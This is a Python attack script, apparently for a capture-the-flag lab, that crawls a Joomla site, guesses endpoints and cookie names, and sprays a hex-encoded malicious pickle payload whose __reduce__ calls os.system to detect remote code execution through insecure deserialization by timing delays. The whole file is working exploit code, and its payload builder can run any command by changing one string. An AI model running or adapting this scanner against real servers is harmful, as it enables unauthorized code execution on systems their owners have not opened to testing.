#!/usr/bin/env python3
"""
Deep trigger enumeration for Voyage-like pickle deserialization chains.

Workflow:
1) Crawl seed paths discovered via Gobuster.
2) Parse links/forms/scripts and include candidates from robots.txt.
3) Probe common dynamic endpoints under discovered Joomla directories.
4) Run time-based pickle payload tests against every candidate URL and cookie key.

Run (AttackBox example):
  python3 deep_trigger_enum.py --target http://10.82.166.188
"""

from __future__ import annotations

import argparse
import binascii
import os
import pickle
import re
import time
from collections import deque
from typing import Iterable
from urllib.parse import urljoin, urlparse

import requests
from bs4 import BeautifulSoup


GOBUSTER_SEEDS = [
    "/",
    "/index.php",
    "/administrator/",
    "/api/",
    "/cache/",
    "/components/",
    "/images/",
    "/includes/",
    "/language/",
    "/layouts/",
    "/media/",
    "/modules/",
    "/plugins/",
    "/templates/",
    "/tmp/",
    "/robots.txt",
]

EXTRA_PROBES = [
    "/api/index.php/v1/config/application?public=true",
    "/api/index.php/v1/users?public=true",
    "/administrator/index.php",
    "/index.php/component/users/login?Itemid=101",
    "/index.php/component/users/reset?Itemid=101",
    "/index.php/component/users/remind?Itemid=101",
    "/tmp/",
    "/cache/",
]

FILE_BASENAMES = [
    "index.php",
    "config.php",
    "configuration.php",
    "api.php",
    "preview.php",
    "report.php",
    "reports.php",
    "dashboard.php",
    "portal.php",
    "pickle.php",
    "debug.php",
    "health.php",
    "status.php",
    "upload.php",
    "login.php",
    "admin.php",
    "test.php",
    "dev.php",
]

COOKIE_CANDIDATES = [
    "310c29008fc04f792e0bccb4682e5b78",
    "03245e095856e4447d1dfb528d67c5d3",
    "userData",
    "user_data",
    "user",
    "session",
    "PHPSESSID",
    "auth",
    "profile",
    "prefs",
    "data",
    "remember",
]


def mk_sleep_payload(seconds: int) -> str:
    class Payload:
        def __reduce__(self):
            return os.system, (f"sleep {seconds}",)

    raw = pickle.dumps({"user": Payload(), "revenue": "999999"}, protocol=4)
    return binascii.hexlify(raw).decode()


def normalize_url(base_url: str, maybe_url: str) -> str | None:
    u = urljoin(base_url, maybe_url)
    p = urlparse(u)
    b = urlparse(base_url)
    if p.scheme not in ("http", "https"):
        return None
    if p.netloc != b.netloc:
        return None
    return f"{p.scheme}://{p.netloc}{p.path}" + (f"?{p.query}" if p.query else "")


def parse_robots(base_url: str, text: str) -> list[str]:
    found: list[str] = []
    for line in text.splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        m = re.match(r"^(?:Allow|Disallow):\s*(\S+)", line, flags=re.I)
        if not m:
            continue
        candidate = m.group(1).strip()
        if candidate == "/":
            continue
        n = normalize_url(base_url, candidate)
        if n:
            found.append(n)
    return found


def crawl(base_url: str, max_pages: int, timeout: int) -> tuple[list[str], set[str]]:
    q = deque(normalize_url(base_url, p) for p in GOBUSTER_SEEDS)
    q = deque(u for u in q if u)
    seen: set[str] = set()
    discovered: set[str] = set()
    cookie_names: set[str] = set()

    while q and len(seen) < max_pages:
        url = q.popleft()
        if url in seen:
            continue
        seen.add(url)
        try:
            r = requests.get(url, timeout=timeout, allow_redirects=True)
        except requests.RequestException:
            continue

        discovered.add(r.url)
        set_cookie = r.headers.get("Set-Cookie", "")
        if set_cookie and "=" in set_cookie:
            cookie_names.add(set_cookie.split("=", 1)[0].strip())

        ctype = (r.headers.get("Content-Type") or "").lower()
        if "text/html" not in ctype and "text/plain" not in ctype:
            continue

        if url.endswith("/robots.txt"):
            for ru in parse_robots(base_url, r.text):
                if ru not in seen:
                    q.append(ru)
                    discovered.add(ru)
            continue

        soup = BeautifulSoup(r.text, "html.parser")
        attrs: list[tuple[str, str]] = [
            ("a", "href"),
            ("link", "href"),
            ("script", "src"),
            ("form", "action"),
            ("img", "src"),
        ]
        for tag, attr in attrs:
            for node in soup.find_all(tag):
                val = node.get(attr)
                if not val:
                    continue
                n = normalize_url(base_url, val)
                if not n:
                    continue
                if n not in seen:
                    q.append(n)
                discovered.add(n)

    return sorted(discovered), cookie_names


def build_candidate_urls(base_url: str, discovered: Iterable[str]) -> list[str]:
    candidates = set(discovered)
    for p in EXTRA_PROBES:
        n = normalize_url(base_url, p)
        if n:
            candidates.add(n)

    dir_paths = set()
    for u in candidates:
        parsed = urlparse(u)
        path = parsed.path
        if path.endswith("/"):
            dir_paths.add(path)
        else:
            parent = path.rsplit("/", 1)[0] + "/"
            dir_paths.add(parent if parent.startswith("/") else "/")

    for d in sorted(dir_paths):
        for base in FILE_BASENAMES:
            n = normalize_url(base_url, d + base)
            if n:
                candidates.add(n)

    return sorted(candidates)


def timing_scan(urls: list[str], cookie_names: list[str], sleep_seconds: int, timeout: int, threshold: float) -> list[dict]:
    payload = mk_sleep_payload(sleep_seconds)
    hits: list[dict] = []

    for url in urls:
        try:
            t0 = time.time()
            requests.get(url, timeout=timeout, allow_redirects=True)
            baseline = time.time() - t0
        except requests.RequestException:
            continue

        for cname in cookie_names:
            s = requests.Session()
            s.cookies.set(cname, payload)
            try:
                t1 = time.time()
                r = s.get(url, timeout=max(timeout, sleep_seconds + 5), allow_redirects=True)
                observed = time.time() - t1
            except requests.RequestException:
                continue

            delta = observed - baseline
            print(
                f"TEST {url} cookie={cname} code={r.status_code} "
                f"base={baseline:.2f}s now={observed:.2f}s delta={delta:.2f}s"
            )
            if delta >= threshold:
                hit = {
                    "url": url,
                    "cookie": cname,
                    "status": r.status_code,
                    "baseline": round(baseline, 2),
                    "observed": round(observed, 2),
                    "delta": round(delta, 2),
                }
                hits.append(hit)
                print(f"[HIT] {hit}")

    return hits


def main() -> None:
    ap = argparse.ArgumentParser(description="Deep enumeration + pickle timing scanner")
    ap.add_argument("--target", required=True, help="Base URL, e.g. http://10.82.166.188")
    ap.add_argument("--max-pages", type=int, default=250)
    ap.add_argument("--timeout", type=int, default=12)
    ap.add_argument("--sleep", type=int, default=7)
    ap.add_argument("--threshold", type=float, default=5.8)
    args = ap.parse_args()

    base_url = args.target.rstrip("/")
    print(f"[*] Target: {base_url}")
    print("[*] Crawling seed paths and collecting endpoints...")
    discovered, dynamic_cookie_names = crawl(base_url, max_pages=args.max_pages, timeout=args.timeout)
    print(f"[*] Discovered URLs: {len(discovered)}")

    all_cookies = sorted(set(COOKIE_CANDIDATES).union(dynamic_cookie_names))
    print(f"[*] Cookie candidates: {all_cookies}")

    candidates = build_candidate_urls(base_url, discovered)
    print(f"[*] Final candidate URL count: {len(candidates)}")

    print("[*] Starting time-based pickle trigger scan...")
    hits = timing_scan(
        urls=candidates,
        cookie_names=all_cookies,
        sleep_seconds=args.sleep,
        timeout=args.timeout,
        threshold=args.threshold,
    )

    print("\n" + "=" * 72)
    print("RESULT")
    print("=" * 72)
    if not hits:
        print("TRIGGER_FOUND False")
        print("No confirmed deserialization trigger in scanned HTTP surface.")
    else:
        print("TRIGGER_FOUND True")
        for h in hits:
            print(h)


if __name__ == "__main__":
    main()
